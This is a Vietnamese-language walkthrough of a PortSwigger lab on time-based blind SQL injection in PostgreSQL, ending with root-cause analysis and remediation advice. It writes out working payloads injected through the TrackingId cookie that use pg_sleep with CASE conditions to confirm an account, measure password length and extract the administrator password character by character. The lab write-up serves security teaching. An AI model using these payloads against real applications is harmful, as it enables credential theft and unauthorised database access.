
**Metadata:**
* **Target:** [PortSwigger Lab: Time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

---

## 1. Reconnaissance & Information Gathering (Thu thập thông tin)

* **Mục tiêu bài Lab:** Khai thác lỗ hổng Blind SQLi dựa trên độ trễ thời gian để tìm mật khẩu của tài khoản `administrator`.
* **Phân tích Bề mặt Tấn công (Attack Surface Analysis):** Lỗ hổng nằm ở cookie `TrackingId`. 
* **Hành vi hệ thống:** Ứng dụng không có bất kỳ thay đổi nào trên giao diện dù truy vấn Đúng hay Sai, và cũng không hiển thị thông báo lỗi. Tuy nhiên, truy vấn được thực thi đồng bộ (**Synchronously**), nghĩa là máy chủ sẽ đợi Database xử lý xong rồi mới trả về phản hồi cho người dùng.

## 2. Vulnerability Analysis (Phân tích lỗ hổng)

Vì không có tín hiệu hình ảnh, ta phải sử dụng các hàm gây trễ (Sleep functions) để xác nhận lỗ hổng. Trên **PostgreSQL**, ta sử dụng hàm `pg_sleep()`.

* **Xác nhận lỗ hổng (Fuzzing for Delay):**
  Gửi Payload sau trong Cookie:
  `TrackingId=x'%3BSELECT+pg_sleep(10)--`
  *(Lưu ý: `%3B` là URL Encode của dấu `;` để kết thúc câu lệnh cũ và bắt đầu câu lệnh mới).*
  
* **Quan sát:** Nếu sau **10 giây** trang web mới load xong $\rightarrow$ Hệ thống chắc chắn bị **Time-based Blind SQLi**.

## 3. Payload Crafting & Exploitation (Xây dựng Payload)

Ở bài này, ta cần kết hợp giữa mệnh đề điều kiện (`CASE`) và hàm gây trễ (`pg_sleep`) để "hỏi" dữ liệu.

### Bước 1: Xác nhận sự tồn tại của user 'administrator'
Ta gửi một câu hỏi: "Nếu user là administrator, hãy ngủ 10 giây".
* **Payload:** `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
* **Kết quả:** Nếu phản hồi bị trễ 10s -> User tồn tại.

### Bước 2: Xác định độ dài mật khẩu
* **Payload:** `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
* **Logic:** Tăng dần con số. Nếu ở mức `>19` thì trễ, nhưng `>20` không trễ -> Mật khẩu dài 20 ký tự.

### Bước 3: Trích xuất mật khẩu (Brute-force từng ký tự)
Đây là phần tốn thời gian nhất. Ta cắt từng ký tự mật khẩu và kiểm tra:
* **Payload mẫu:** `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

* **Quy trình:**
    * Nếu Server phản hồi ngay lập tức (~0s) -> Ký tự thứ 1 **không phải** là 'a'.
    * Nếu Server phản hồi sau 10s -> Ký tự thứ 1 **chính xác** là 'a'.


## 4. Root Cause Analysis - RCA (Phân tích Nguyên nhân Cốt lõi)

Nguyên nhân vẫn nằm ở việc ghép chuỗi SQL động trong Cookie. Tuy nhiên, điểm yếu nằm ở chỗ ứng dụng thực hiện truy vấn cơ sở dữ liệu một cách đồng bộ trên cùng một luồng (Thread) xử lý HTTP Request. Điều này cho phép kẻ tấn công điều khiển thời gian phản hồi của ứng dụng thông qua các lệnh điều khiển luồng của Database.

## 5. Mitigation & Remediation (Chiến lược Khắc phục)

* **Biện pháp kỹ thuật:** Sử dụng **Parameterized Queries** để ngăn chặn việc chèn mã SQL.
* **Cấu hình hệ thống:** Thiết lập **Request Timeout** ở mức hợp lý để ngắt các kết nối bị treo quá lâu. 
* **Kiến trúc:** Nếu có thể, hãy thực hiện các truy vấn mang tính chất phân tích/theo dõi (như TrackingId) một cách bất đồng bộ (**Asynchronously**) để thời gian xử lý của Database không ảnh hưởng trực tiếp đến thời gian phản hồi của người dùng.